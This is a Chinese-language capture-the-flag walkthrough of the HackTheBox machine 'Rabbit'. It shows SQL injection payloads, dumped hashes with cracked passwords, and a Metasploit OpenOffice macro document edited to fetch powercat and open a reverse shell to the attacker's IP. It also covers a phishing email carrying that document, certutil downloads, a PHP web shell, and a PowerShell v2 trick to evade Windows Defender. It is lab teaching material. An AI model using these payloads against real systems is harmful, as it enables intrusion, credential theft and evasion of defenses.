Rabbit是一个非常困难的靶机，知识点涉及垂直越权、SQL注入、邮件钓鱼、服务提权、Windows
Defender绕过等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-10-28
下午3.46.44](https://image.3001.net/images/20220421/1650531552_62611ce088d3415978822.png!small)  
 _通关思维导图_  
![Rabbit](https://image.3001.net/images/20220421/1650531555_62611ce30c1b82448216b.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.71 -oA nmap_Rabbit
    

![截屏2021-10-29
上午11.31.49](https://image.3001.net/images/20220421/1650531557_62611ce5c821654021ff4.png!small)  
![截屏2021-10-29
上午11.32.05](https://image.3001.net/images/20220421/1650531559_62611ce74fd0134ac83b8.png!small)  
![截屏2021-10-29
上午11.32.20](https://image.3001.net/images/20220421/1650531560_62611ce8e139a38fc7b57.png!small)  
扫描结果显示目标开放了80、88、135、443、445等端口，不愧是”狡兔三窟“

#### 80端口

访问后站点显示403  
![截屏2021-10-29
下午1.07.12](https://image.3001.net/images/20220421/1650531562_62611ceaaf20b02445e8c.png!small)

#### 443端口

访问后发现这是 IIS 7 的默认界面  
![截屏2021-10-29
下午1.08.15](https://image.3001.net/images/20220421/1650531563_62611cebd0f83f0abaa2a.png!small)

使用 gobuster 对站点进行目录扫描

    
    
    gobuster dir -u https://10.10.10.71 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
    

**注意：需要添加`-k`参数英语跳过证书认证，否则会出现无效证书的报错信息**  
![截屏2021-10-29
下午1.55.33](https://image.3001.net/images/20220421/1650531565_62611cedca9574be2e160.png!small)

正常情况访问到的目录都指向`https://10.10.10.71/owa`  
![截屏2021-10-29
下午4.57.17](https://image.3001.net/images/20220421/1650531567_62611cef67ba18874f864.png!small)

访问该目录发现这是 outlook 邮件登陆界面

> Outlook是由微软公司所出品Office内的个人信息管理系统软件，功能包括收发电子邮件、查看日历等

![截屏2021-10-29
下午4.57.44](https://image.3001.net/images/20220421/1650531570_62611cf24448b515eb7c2.png!small)

#### 8080端口

访问后发现这是一个演示界面  
![截屏2021-10-29
下午1.07.51](https://image.3001.net/images/20220421/1650531571_62611cf373b994f898962.png!small)

使用 gobuster 对站点进行目录扫描

    
    
    gobuster dir -u http://10.10.10.71:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    

![截屏2021-10-29
下午1.51.36](https://image.3001.net/images/20220421/1650531573_62611cf50433178a54f34.png!small)

结果存在两个301跳转，分别访问对应目录`/joomla`、`/complain`

在`/joomla`目录中未发现可利用点  
![截屏2021-10-29
下午1.56.50](https://image.3001.net/images/20220421/1650531574_62611cf62a3d7d4c8bc77.png!small)

`/comlain`目录则是一个名为 Complain Management System
的应用，默认账号密码为`admin/admin123`，但无法登录  
![截屏2021-10-29
下午1.56.58](https://image.3001.net/images/20220421/1650531575_62611cf77d9f77b16f28e.png!small)

### 垂直越权漏洞

尝试在注册页面`/complain/register.php`中注册账户，设置账号密码为`admin/admin123`，用户类型为
`Customer`，注册完成后进入用户界面  
![截屏2021-10-29
下午3.48.46](https://image.3001.net/images/20220421/1650531577_62611cf921cbc0a62d50d.png!small)

点击`View Complain Details`发现其参数对应的是`mod=customer&view=compDetails`  
![截屏2021-10-29
下午3.54.13](https://image.3001.net/images/20220421/1650531578_62611cfa23cbba52083be.png!small)

在请求中将参数`mod`修改为 admin 后可以发能够看到投诉详情，说明存在垂直越权漏洞  
![截屏2021-10-29
下午4.01.33](https://image.3001.net/images/20220421/1650531579_62611cfbbf1a3d6945ce8.png!small)

### SQL注入漏洞

在 exploit-db 中我们发现 Complain Management System
除了越权以外还存在SQL注入，漏洞路径为`/complain/view.php?mod=admin&view=repod&id=plans`，开始尝试进行手工注入  
 **参考文章1：https://www.exploit-db.com/exploits/42968**  
 **参考文章2：https://www.exploit-db.com/exploits/41131**

首先获取数据库的基本信息，发现当前数据库版本为 5.7.19，当前用户为 Dbuser@localhost

    
    
    id=engineer union all select 1,version(),3,user(),5,database(),7--    

![截屏2021-10-29
下午4.15.24](https://image.3001.net/images/20220421/1650531581_62611cfd9a65ac21c746d.png!small)

查看所有数据库名，其中包含`secret`、`Joomla`等

    
    
    id=engineer union all select 1,schema_name,3,4,5,6,7 from information_schema.schemata--    

![截屏2021-10-29
下午4.19.38](https://image.3001.net/images/20220421/1650531582_62611cfee75662467be9e.png!small)

查看`secret`数据库中的所有表，其中包含`users`表  
 **注意：需要将库名修改为hex编码**

    
    
    id=engineer union all select 1,table_name,3,4,5,6,7 from information_schema.tables where table_schema=0x736563726574--    

![截屏2021-10-29
下午4.22.18](https://image.3001.net/images/20220421/1650531584_62611d0031745b3056bd4.png!small)

查看`users`表中所有列名，其中包含`username`和`password`

    
    
    id=engineer union all select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=0x7573657273--    

![截屏2021-10-29
下午4.51.18](https://image.3001.net/images/20220421/1650531585_62611d0164332cd59b9ab.png!small)

尝试获取`users`表中列名`username`和`password`当中的数据

    
    
    id=engineer union all select 1,username,password,4,5,6,7 from secret.users--    

![截屏2021-10-29
下午4.53.38](https://image.3001.net/images/20220421/1650531586_62611d0288d0957bb3305.png!small)

成功获取账号密码如下：

    
    
    Kain 	       33903fbcc0b1046a09edfaa0a65e8f8c
     Raziel 	   719da165a626b4cf23b626896c213b84
     Ariel 	       B9c2538d92362e0e18e52d0ee9ca0c6f
     Dimitri 	   D459f76a5eeeed0eca8ab4476c144ac4
     Magnus 	   370fc3559c9f0bff80543f2e1151c537
     Zephon 	   13fa8abd10eed98d89fd6fc678afaf94
     Turel 	       D322dc36451587ea2994c84c9d9717a1
     Dumah 	       33da7a40473c1637f1a2e142f4925194
     Malek 	       Dea56e47f1c62c30b83b70eb281a6c39
     Moebius 	   A6f30815a43f38ec6de95b9a9d74da37
    

当然我们也可以直接利用 sqlmap 来获取对应信息

    
    
    sqlmap -u 'http://10.10.10.71:8080/complain/view.php?mod=admin&view=repod&id=plans' --cookie='PHPSESSID= ' -D secret -T users --dump
    

**注意：需要在其中填入 Cookie 信息**

在破解网站对获取到的密文进行破解  
 **破解网站：https://crackstation.net/**  
![截屏2021-10-29
下午5.44.17](https://image.3001.net/images/20220421/1650531588_62611d0406de2e1e46517.png!small)  
解密结果如下：

    
    
    33903fbcc0b1046a09edfaa0a65e8f8c	md5	doradaybendita
    719da165a626b4cf23b626896c213b84	md5	kelseylovesbarry
    B9c2538d92362e0e18e52d0ee9ca0c6f	md5	pussycatdolls
    D459f76a5eeeed0eca8ab4476c144ac4	md5	shaunamaloney
    370fc3559c9f0bff80543f2e1151c537	md5	xNnWo6272k7x
    13fa8abd10eed98d89fd6fc678afaf94	Unknown	Not found.
    D322dc36451587ea2994c84c9d9717a1	Unknown	Not found.
    33da7a40473c1637f1a2e142f4925194	md5	popcorn
    Dea56e47f1c62c30b83b70eb281a6c39	md5	barcelona
    A6f30815a43f38ec6de95b9a9d74da37	md5	santiago
    

## 0x02 上线[raziel]

### OWA邮件系统

使用破解后的账号密码`Kain/doradaybendita`登录OWA  
![截屏2021-11-01
下午9.33.23](https://image.3001.net/images/20220421/1650531589_62611d05c212b0e5ef7ac.png!small)

查看邮箱中的邮件以获取关键信息  
![截屏2021-11-01
下午9.33.31](https://image.3001.net/images/20220421/1650531591_62611d070cf4b7b577f1d.png!small)

在其中我们获取到如下信息：

    
    
    1.Open Office 已部署
    2.Windows Defender 已开启
    3.PowerShell 已限制
    

### 制作木马

使用 MSF 针对 Open Office 生成反弹shell文档`msf.odt`

    
    
    msfconsole
    msf > use exploit/multi/misc/openoffice_document_macro
    msf > set srvhost 10.10.14.17
    msf > set lhost 10.10.14.17
    msf > run
    

![截屏2021-11-01
下午9.52.10](https://image.3001.net/images/20220421/1650531592_62611d086110b3a59e2e5.png!small)

将文档后缀名修改为`.zip`并将其解压

    
    
    mv msf.odt msf.zip
    

解压后在其中找到`Basic/Standard/`目录，编辑文件`Module1.xml`并修改`payload`如下

    
    
    powershell.exe IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 1234 -e cmd
    

根据提示信息可知目前 powershell 已被限制，尝试将其版本修改为`2`来绕过限制

    
    
    powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 1234 -e cmd;
    

![截屏2021-11-02
上午3.05.08](https://image.3001.net/images/20220421/1650531595_62611d0b02e6ff4e4fba3.png!small)

接下来将`powercat.ps1`复制到本目录下并开启 http 服务

    
    
    cp /root/hackthebox/Machines/Jeeves/powercat.ps1 .
    python -m SimpleHTTPServer 80
    

![截屏2021-11-01
下午10.11.43](https://image.3001.net/images/20220421/1650531596_62611d0c21c1319945eef.png!small)

在本地监听1234端口

    
    
    nc -nvlp 1234
    

![截屏2021-11-01
下午10.11.55](https://image.3001.net/images/20220421/1650531597_62611d0d369761417d6cf.png!small)

### 钓鱼邮件

在尝试发送邮件时又遇到一个小问题：选择邮件发送但是无法上传文件。通过不断尝试后我们发现了解决方法，只需要在登录界面选择轻量版登录即可  
![截屏2021-11-01
下午11.39.29](https://image.3001.net/images/20220421/1650531598_62611d0e3fe17b50d14cf.png!small)

将用户切换为 Ariel 后上传文件并向每个联系人发送邮件  
![截屏2021-11-02
上午12.20.51](https://image.3001.net/images/20220421/1650531599_62611d0f803402d636bdc.png!small)

经过漫长的等待之后成功拿到反弹shell，但这个shell每隔一段时间就会自动断开  
![截屏2021-11-02
上午9.50.18](https://image.3001.net/images/20220421/1650531600_62611d10a2e6711624994.png!small)

在当前用户桌面上寻找flag，成功拿到第一个flag

    
    
    dir C:\Users\Raziel\Desktop
    type C:\Users\Raziel\Desktop\user.txt
    

![截屏2021-11-02
上午10.26.00](https://image.3001.net/images/20220421/1650531602_62611d1214a8cdf7fa914.png!small)

## 0x03 权限提升[system]

### 信息收集

查看系统信息，发现操作系统版本为 Windows Server 2008 R2

    
    
    systeminfo
    

![截屏2021-11-02
上午9.59.19](https://image.3001.net/images/20220421/1650531603_62611d13a7324ce4bf3a1.png!small)

系统中安装多个补丁，经检测后发现无法使用内核提权  
![截屏2021-11-02
上午9.59.52](https://image.3001.net/images/20220421/1650531606_62611d16a17a7363504d0.png!small)

在进程中未发现可用信息

    
    
    tasklist /v
    

![截屏2021-11-02
上午10.28.35](https://image.3001.net/images/20220421/1650531609_62611d1970d87322b90e3.png!small)

在服务中发现 Apache 和 Mysql 服务，它们的运行权限都为系统权限，因此我们可以从这些服务入手完成提权

    
    
    wmic service where started=true get name,startname
    

![截屏2021-11-02
上午10.29.45](https://image.3001.net/images/20220421/1650531612_62611d1ca6a440d670c14.png!small)

### Windows Defender限制

检查当前用户对`wamp`根目录拥有何种权限，结果显示具有写入权限

    
    
    cacls C:\wamp64
    

![截屏2021-11-02
上午11.04.33](https://image.3001.net/images/20220421/1650531614_62611d1e3530dd8d89d05.png!small)

既然如此我们可进入 web 目录并插入木马，但是木马`cmd.php`一经写入直接被 Windows Defender 杀掉

    
    
    echo '<?php echo system($_GET["cmd"]);?>' > cmd.php
    certutil -urlcache -split -f http://10.10.14.17/cmd.php c:\wamp64\www\cmd.php
    

![截屏2021-11-02
上午11.05.36](https://image.3001.net/images/20220421/1650531615_62611d1f0bd67525471d5.png!small)

尝试上传 nc.exe，但没过一会 nc.exe 也被杀掉了

    
    
    certutil  -f -split -urlcache  http://10.10.14.17/nc.exe C:\Temp\nc.exe
    

![截屏2021-11-02
上午11.41.06](https://image.3001.net/images/20220421/1650531615_62611d1fd1c736204a41e.png!small)  
那么我们还是尝试使用之前的 powershell v2 来绕过 Windows Defender

### Windows Defender绕过

创建`cmd.bat`文件用于设置反弹shell

    
    
    powershell.exe -version 2 IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 2345 -e cmd;
    

创建`cmd.php`文件用于执行bat文件

    
    
    <?php echo exec("C:\wamp64\www\cmd.bat");?>
    

使用 certutil 上传`cmd.bat`、`cmd.php`

    
    
    certutil -urlcache -split -f http://10.10.14.17/cmd.php c:\wamp64\www\cmd.php
    certutil -urlcache -split -f http://10.10.14.17/cmd.bat c:\wamp64\www\cmd.bat
    

在本地监听2345端口

    
    
    nc -nvlp 2345
    

访问木马地址`/cmd.php`可成功获得目标shell

    
    
    curl http://10.10.10.71:8080/cmd.php
    

![截屏2021-11-02
下午12.51.25](https://image.3001.net/images/20220421/1650531616_62611d20e88c4e4015c71.png!small)  
在管理员桌面上寻找flag

    
    
    dir c:\Users\Administrator\Desktop
    type c:\Users\Administrator\Desktop\root.txt
    

![截屏2021-11-02
下午12.53.14](https://image.3001.net/images/20220421/1650531617_62611d21be226b2eb2350.png!small)  
成功获取第二个flag

 **总结：由于该靶机存在N多个端口，因此我们初期的工作就是寻找弱点。最终在位于8080端口的站点中找到了应用Complain Management
System，通过搜索该应用系统的Nday漏洞，其中存在的SQL注入帮助我们获取到了需要的账号密码，利用其中的账号密码登陆OWA并发送带有恶意odt的钓鱼邮件，受害者打开后会执行反弹shell，从而成功获取用户权限。在靶机中存在杀软Windows
Defender，我们可利用Powershell
v2编写bat脚本用于绕过杀软，当然令人震惊的还是Apache服务的运行权限居然是系统权限，我们可将木马上传至web站点，使用PHP执行bat脚本。这样就成功借助Apache服务提权至系统权限**

